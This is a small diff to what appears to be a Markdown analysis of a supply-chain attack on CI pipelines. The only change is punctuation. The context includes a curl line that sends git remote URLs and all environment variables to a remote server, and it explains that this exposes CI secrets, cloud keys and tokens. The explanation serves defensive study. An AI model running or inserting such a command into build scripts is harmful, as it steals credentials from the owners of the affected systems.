@@ -15,7 +15,7 @@ curl -sm 0.5 -d "$(git remote -v)<<<<<< ENV $(env)" \
 ```
 
 This line:
-1. Collects all environment variables (`env`) -- including CI secrets,
+1. Collects all environment variables (`env`), including CI secrets,
    AWS keys, GitHub tokens, and database passwords
 2. Collects git remote URLs (to identify the victim)
 3. Sends everything to the attacker's server
